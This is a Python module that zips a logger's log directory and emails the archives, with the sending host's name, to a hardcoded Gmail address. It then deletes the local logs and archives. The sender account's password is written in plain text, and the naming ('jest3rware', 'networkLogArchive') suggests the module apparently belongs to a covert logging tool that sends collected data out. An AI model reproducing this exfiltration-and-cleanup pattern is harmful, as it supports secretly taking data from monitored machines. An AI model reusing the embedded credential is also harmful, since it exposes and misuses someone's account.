import time
import datetime
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import zipfile
import smtplib
import os
import logger
from email.message import EmailMessage
from email import encoders
import socket

default_email = 'medicup@gmail.com'


def send_mail(email=default_email):
    zip_files()
    check_for_content_to_mail()
    #mailer()


def zip_files():
    name = 'networkLogArchive_{}.zip'.format(datetime.datetime.now().strftime('%y%m%d'))
    directory = logger.log_directory
    file_paths = get_all_file_paths(directory)

    try:
        with zipfile.ZipFile(name, 'w') as zip_file:
            for file in file_paths:
                zip_file.write(file)

    except Exception as e:
        return 'Unable to zip all files as planned: {}'.format(e)

    logger.delete_log_files()
    logger.update_log_file('all files zipped')


def get_all_file_paths(directory):
    file_paths = []

    for root, directories, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)

    return file_paths


def check_for_content_to_mail():
    mail_list = []
    if os.listdir('.'):
        zip_list = os.listdir('.')
        print(zip_list)
        for file in zip_list:
            if os.path.isfile(file) and '.zip' in file:
                mail_list.append(file)

        print(mail_list)

        if mail_list is not None:
            logger.update_log_file('Located archive file(s) for export {}'.format(mail_list))
            mailer(mail_list)


def mailer(mail_list):
    archive_list = mail_list
    print(archive_list)  # todo remove

    from_email = "jest3rware@gmail.com"
    from_password = "#E1T1OAOnY#aW2"
    to_email = default_email

    subject = "Network log files report"
    message = 'Attached is an archive file from {}'.format(socket.gethostname())

    msg = MIMEMultipart()
    msg["Subject"] = subject
    msg["To"] = to_email
    msg["From"] = from_email
    msg_body = message
    msg.attach(MIMEText(msg_body, 'plain'))

    for file in mail_list:
        zf = open(file, 'rb')
        part = MIMEBase('application', "octet-stream")
        part.set_payload(zf.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename='{}'.format(file))
        msg.attach(part)

    gmail = smtplib.SMTP("smtp.gmail.com", 587)
    gmail.ehlo()
    gmail.starttls()
    gmail.login(from_email, from_password)

    try:
        gmail.send_message(msg)
        logger.update_log_file('Mail successfully sent.')
        for file in mail_list:
            os.remove(file)
        gmail.quit()

    except Exception as e:
        print(e)







    # if os.listdir(logger.archive_directory) is not None:
    #     try:
    #         logger.update_log_file(
    #             "Sending the following archived test by email: {}".format(
    #                 zip_file_list
    #             )
    #         )
    #
    #         print('mail sent')
    #
    #         #logger.delete_log_files(logger.archive_directory)
    #
    #         print(
    #             'mail success'
    #         )
    #         time.sleep(15)
    #     except Exception as e:
    #         print(e)


def delete_files(path):
    folder_path = path

    #print('zip_file_list = {}'.format(zip_file_list))


